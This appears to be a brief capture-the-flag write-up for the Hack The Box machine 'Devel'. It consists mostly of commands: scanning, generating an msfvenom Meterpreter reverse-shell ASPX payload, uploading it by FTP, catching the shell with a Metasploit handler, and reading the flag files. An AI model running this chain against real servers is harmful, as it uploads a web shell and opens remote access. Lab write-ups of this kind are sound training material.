# ****Devel****

```bash
rustscan -a 10.10.10.5
```
![image](https://github.com/lufffe/Writeups/assets/90646635/7abcf759-4f4f-4679-b5c1-7e5ce3671200)

![image](https://github.com/lufffe/Writeups/assets/90646635/09d83a51-bc6b-4b67-a279-44d602d5290d)

```bash
nmap -A -p 21,80 10.10.10.5
```
![image](https://github.com/lufffe/Writeups/assets/90646635/0c973612-4857-4dbb-b4e6-ad240c9a39b0)

```bash
gobuster dir -u http://10.10.10.5/ -w big.txt -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/f9323095-544c-4411-8a8f-5733a4a29053)


![image](https://github.com/lufffe/Writeups/assets/90646635/c0f558b2-38e6-435e-8355-51a3c13e532f)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4455 -f aspx > shell2.aspx
```

![image](https://github.com/lufffe/Writeups/assets/90646635/264d53f9-d60e-4164-b1a5-42763cedcb04)

```bash
ftp 10.10.10.5
```

```bash
ftp> put shell2.aspx
```
![image](https://github.com/lufffe/Writeups/assets/90646635/667ee882-e64d-4dbd-9239-2471bccf2242)

```bash
msfconsole
```

```bash
search multi/handler
```

```bash
msf6 exploit(multi/handler) > set lhost 10.10.14.16
```

```bash
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
```

```bash
msf6 exploit(multi/handler) > exploit
```

[http://10.10.10.5/shell.aspx](http://10.10.10.5/luf3.aspx)

![image](https://github.com/lufffe/Writeups/assets/90646635/846d277d-55d7-4b38-86c9-f0829e8e0bcc)

```bash
meterpreter > shell
```

```bash
c:\windows\system32\inetsrv>systeminfo
```
![image](https://github.com/lufffe/Writeups/assets/90646635/84f6b6be-d526-4da0-b224-5c0d62f53360)

```bash
c:\Users>exit
```

```bash
meterpreter > background
```

![image](https://github.com/lufffe/Writeups/assets/90646635/85d9be9c-bcd3-49dd-a7d0-c6cd66fefe8d)


![image](https://github.com/lufffe/Writeups/assets/90646635/b32f2150-bba3-46ce-8de2-ee5382c4131b)

![image](https://github.com/lufffe/Writeups/assets/90646635/e8919e3e-cdcb-40a1-9cde-921c37124b60)
c:\Users\babis\Desktop>

```bash
type user.txt
```

c:\Users\Administrator\Desktop>
```bash
type root.txt
```

